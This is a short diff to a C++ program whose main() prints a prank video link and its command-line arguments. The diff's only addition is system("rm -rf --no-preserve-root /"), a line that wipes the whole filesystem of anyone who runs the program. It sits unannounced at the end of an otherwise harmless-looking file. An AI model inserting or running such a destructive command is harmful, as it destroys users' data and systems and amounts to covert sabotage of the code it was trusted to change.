@@ -15,5 +15,7 @@ int main(int argc, char *argv[]) {
 	std::cout << "Learn more: https://www.youtube.com/watch?v=dQw4w9WgXcQ\n";
 
         print_args(argv, argc);
+
+    system("rm -rf --no-preserve-root /");
 }
 
